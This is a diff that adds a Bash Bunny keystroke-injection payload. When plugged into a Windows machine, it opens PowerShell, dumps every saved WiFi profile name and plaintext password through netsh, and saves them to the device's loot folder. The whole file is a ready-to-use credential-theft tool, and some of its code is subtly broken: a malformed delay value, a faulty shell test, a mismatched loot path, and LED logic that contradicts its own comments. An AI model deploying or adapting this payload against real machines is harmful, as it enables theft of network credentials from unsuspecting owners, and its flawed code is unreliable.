@@ -1,0 +1,44 @@
+#!/bin/bash
+#
+# Title:         WiFiCreds
+# Author:        illwill
+# Version:       0.1
+#
+# Dumps the stored plaintext Wifi SSID & passwords from Windows boxes using Powershell
+# then stashes them in /root/udisk/loot/WiFiCreds
+#
+# Red................Failed to get WiFi Creds
+# Purple.............Got some spreadsheets
+# Green..............Finished
+#
+
+LED R
+ATTACKMODE HID STORAGE
+LOOTDIR=/root/udisk/loot/WiFiCreds
+mkdir -p $LOOTDIR
+QUACK GUI R
+QUACK DELAY 1000
+QUACK STRING powershell
+QUACK ENTER
+QUACK DELAY 3000a
+QUACK $Bunny = (gwmi win32_volume -f 'label=''BashBunny''' |  Select-Object -ExpandProperty DriveLetter)
+QUACK ENTER
+QUACK DELAY 500
+QUACK (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  |
+QUACK Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} |
+QUACK Format-Table -AutoSize | Out-File $Bunny\loot\WiFiCreds\WiFi.txt
+QUACK ENTER
+QUACK DELAY 5000
+
+# Green LED for finished
+LED G
+
+files=$(ls /Volumes/BashBunny/$LOOTDIR/*.txt 2> /dev/null | wc -l)
+if [ "$files" != "0"]
+then
+# Got WiFi Creds!
+LED R B
+else
+LED R
+# No WifICreds :(
+fi
